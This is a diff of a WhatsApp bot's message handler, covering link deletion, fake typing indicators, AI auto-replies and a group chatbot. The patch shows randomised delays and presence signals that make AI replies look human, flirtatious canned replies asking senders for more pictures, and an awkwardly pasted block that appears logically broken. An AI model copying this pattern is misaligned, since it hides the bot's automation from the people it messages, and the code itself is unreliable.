+
+// ignore bot messages
+if (msg.key.fromMe) return
+
+// body extract
+const messageTypes = msg.message
+
+chatId = msg.key.remoteJid
+let body = messageTypes?.conversation || 
+           messageTypes?.extendedTextMessage?.text || 
+           messageTypes?.imageMessage?.caption || 
+           messageTypes?.videoMessage?.caption || 
+           messageTypes?.audioMessage?.caption ||
+           messageTypes?.documentMessage?.caption ||
+           ''
+
+// bot admin check
+const metadata = await bad.groupMetadata(chatId)
+const botId = bad.user.id.split(':')[0] + '@s.whatsapp.net'
+const isBotAdmin = metadata.participants.find(p => p.id === botId)?.admin
+if (!isBotAdmin) return
+
+// antilink setting
+const antilink = getSetting(chatId, "antilink") || "delete"
+
+// link detection
+if (antilink && /(https?:\/\/|www\.|chat\.whatsapp\.com)/i.test(body)) {
+  if (antilink === "delete") {
+    await bad.sendMessage(chatId, { delete: msg.key })
+  }
+}
+            
+            // ==================== AUTO PRESENCE ====================
+            const lastPresence = activePresence.get(chatId)
+            if (!lastPresence || Date.now() - lastPresence > 3000) {
+                activePresence.set(chatId, Date.now())
+                
+                if (global.autoPresence && global.autoPresence !== 'off') {
+                    const presenceType = global.autoPresence === 'typing' ? 'composing' 
+                                       : global.autoPresence === 'recording' ? 'recording'
+                                       : 'available'
+                    
+                    await bad.sendPresenceUpdate(presenceType, chatId)
+                    
+                    setTimeout(async () => {
+                        try {
+                            await bad.sendPresenceUpdate('paused', chatId)
+                        } catch {}
+                    }, 10000)
+                }
+                
+                if (!global.autoPresence || global.autoPresence === 'off') {
+                    if (global.autoTyping) {
+                        await bad.sendPresenceUpdate('composing', chatId)
+                        
+                        setTimeout(async () => {
+                            try {
+                                await bad.sendPresenceUpdate('paused', chatId)
+                            } catch {}
+                        }, 10000)
+                    }
+                    
+                    if (global.autoRecording) {
+                        await bad.sendPresenceUpdate('recording', chatId)
+                        
+                        setTimeout(async () => {
+                            try {
+                                await bad.sendPresenceUpdate('paused', chatId)
+                            } catch {}
+                        }, 10000)
+                    }
+                }
+            }
+            
+            // ==================== AUTO REPLY (DMs) ====================
+            if (global.autoReply && !from.endsWith('@g.us')) {
+                if (!body || body.startsWith('.') || body.startsWith('!') || body.startsWith('/') || body.startsWith('#')) continue
+                
+                const lastReply = autoReplyCache.get(from)
+                if (lastReply && Date.now() - lastReply < 10000) continue
+                
+                await bad.sendPresenceUpdate('composing', from)
+                
+                const aiResponse = await getClaudeResponse(body)
+                
+                if (aiResponse) {
+                    await new Promise(resolve => setTimeout(resolve, 2000))
+                    
+                    await bad.sendMessage(from, { 
+                        text: aiResponse 
+                    }, { quoted: msg })
+                    
+                    autoReplyCache.set(from, Date.now())
+                } else {
+                    const fallbacks = ['ɢᴏᴛ ɪᴛ! 👍', 'ᴛʜᴀɴᴋs! 📬', 'ʀᴇᴄᴇɪᴠᴇᴅ! ✅']
+                    const random = fallbacks[Math.floor(Math.random() * fallbacks.length)]
+                    
+                    await bad.sendMessage(from, { 
+                        text: random 
+                    }, { quoted: msg })
+                    
+                    autoReplyCache.set(from, Date.now())
+                }
+                
+                await bad.sendPresenceUpdate('paused', from)
+                continue
+            }
+            
+            // ==================== CHATBOT (GROUPS) ====================
+            if (!global.chatbot || !global.chatbot.has(from)) continue
+            
+            console.log(`🤖 Chatbot enabled in group: ${from}`)
+            
+            const botNumber = bad.user.id.split(':')[0] + '@s.whatsapp.net'
+            const isBotMentioned = messageTypes?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(botNumber)
+            
+            const quotedMsg = messageTypes?.extendedTextMessage?.contextInfo?.quotedMessage
+            const isReplyToBot = messageTypes?.extendedTextMessage?.contextInfo?.participant === botNumber ||
+                                 messageTypes?.extendedTextMessage?.contextInfo?.remoteJid === botNumber
+            
+            const hasMedia = messageTypes?.imageMessage || 
+                           messageTypes?.videoMessage || 
+                           messageTypes?.audioMessage ||
+                           messageTypes?.stickerMessage ||
+                           messageTypes?.documentMessage
+            
+            if (!body && !hasMedia && !isBotMentioned && !isReplyToBot) continue
+            
+            if (body && (body.startsWith('.') || body.startsWith('!') || body.startsWith('/') || body.startsWith('#'))) {
+                console.log('⏭️ Skipping command')
+                continue
+            }
+            
+            const cacheKey = `${from}-${body.substring(0, 20)}`
+            const lastResponse = chatbotCache.get(cacheKey)
+            if (lastResponse && Date.now() - lastResponse < 15000 && !isBotMentioned && !isReplyToBot) {
+                console.log('⏭️ Skipping cache')
+                continue
+            }
+            
+            console.log(`👤 User: ${sender}`)
+            console.log(`💬 Message: "${body.substring(0, 50)}..."`)
+            
+            let chatbotQuery = body
+            
+            if (isBotMentioned) {
+                chatbotQuery = body.replace(/@\d+/g, '').trim() || 'hi'
+            }
+            
+            if (isReplyToBot && quotedMsg) {
+                chatbotQuery = `${body}`
+            }
+            
+            if (hasMedia) {
+                let mediaType = 'file'
+                if (messageTypes?.imageMessage) mediaType = 'image'
+                else if (messageTypes?.videoMessage) mediaType = 'video'
+                else if (messageTypes?.audioMessage) mediaType = 'audio'
+                else if (messageTypes?.stickerMessage) mediaType = 'sticker'
+                else if (messageTypes?.documentMessage) mediaType = 'document'
+                
+                if (!body) {
+                    const mediaResponses = {
+                        'image': 'omg love the pic cutie! 😍✨ you look amazing babe 💕 hehe send more hun 😘',
+                        'video': 'ooh a video! 🎥 can\'t wait to watch it love 😚💖 you\'re so creative sweetheart 🥰',
+                        'audio': 'aww a voice note! 🎵 i love hearing from you babe 😘💕 your voice is so cute hun 🥺',
+                        'sticker': 'hehe that sticker is adorable! 😆💕 just like you cutie 😚✨',
+                        'document': 'got your file love! 📄 thanks for sharing babe 🥰💖'
+                    }
+                    
+                    const response = mediaResponses[mediaType] || 'aww thanks for sharing babe! 💕😘'
+                    await bad.sendMessage(from, { text: response }, { quoted: msg })
+                    chatbotCache.set(cacheKey, Date.now())
+                    await bad.sendPresenceUpdate('paused', from)
+                    continue
+                }
+            }
+            
+            await bad.sendPresenceUpdate('composing', from)
+            
+            const aiResponse = await getChatGPTResponse(chatbotQuery, sender, from)
+            
+            if (aiResponse) {
+                console.log(`✅ Sending: "${aiResponse.substring(0, 50)}..."`)
+                await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1500))
+                
+                await bad.sendMessage(from, { 
+                    text: aiResponse 
+                }, { quoted: msg })
+                
+                chatbotCache.set(cacheKey, Date.now())
+            }
+            
+            await bad.sendPresenceUpdate('paused', from)
+            
+        } catch (err) {
+            console.error('❌ Message handler error:', err.message)
         }
-    } catch (err) {
-        console.error('handleMessage Error:', err);
+    }
+    
+    // ==================== CACHE CLEANUP ====================
+    const now = Date.now()
+    
+    for (const [chatId, timestamp] of activePresence.entries()) {
+        if (now - timestamp > 30000) {
+            activePresence.delete(chatId)
+        }
+    }
+    
+    for (const [user, timestamp] of autoReplyCache.entries()) {
+        if (now - timestamp > 60000) {
+            autoReplyCache.delete(user)
+        }
+    }
+    
+    for (const [key, timestamp] of chatbotCache.entries()) {
+        if (now - timestamp > 120000) {
+            chatbotCache.delete(key)
+        }
+    }
+    
+    if (global.chatbotData) {
+        for (const [key, conversation] of global.chatbotData.entries()) {
+            if (conversation.length > 0) {
+                const lastMessage = conversation[conversation.length - 1]
+                if (now - lastMessage.timestamp > 86400000) {
+                    global.chatbotData.delete(key)
+                    console.log(`🗑️ Cleaned up old conversation: ${key}`)
+                }
+            }
+        }
     }
 };
 
@@ -12881,13 +12900,10 @@ module.exports.setupEventListeners = function(bad, store) {
 };
 
 // ==================== OTHER EXPORTS ====================
-module.exports = { 
-    handleMessage, 
-    setupEventListeners: module.exports.setupEventListeners, // Fix: Use the real function defined above
-    groupMetadataCache,
-    refreshGroupMetadata,
-    checkAdminStatus
-};
+module.exports = handleMessage; // ✅ Main handler (MUST BE FIRST)
+module.exports.groupMetadataCache = groupMetadataCache;
+module.exports.refreshGroupMetadata = refreshGroupMetadata;
+module.exports.checkAdminStatus = checkAdminStatus;
 // ═══════════════════════════════════════════════════════════
 // FILE WATCHER
 // ═══════════════════════════════════════════════════════════
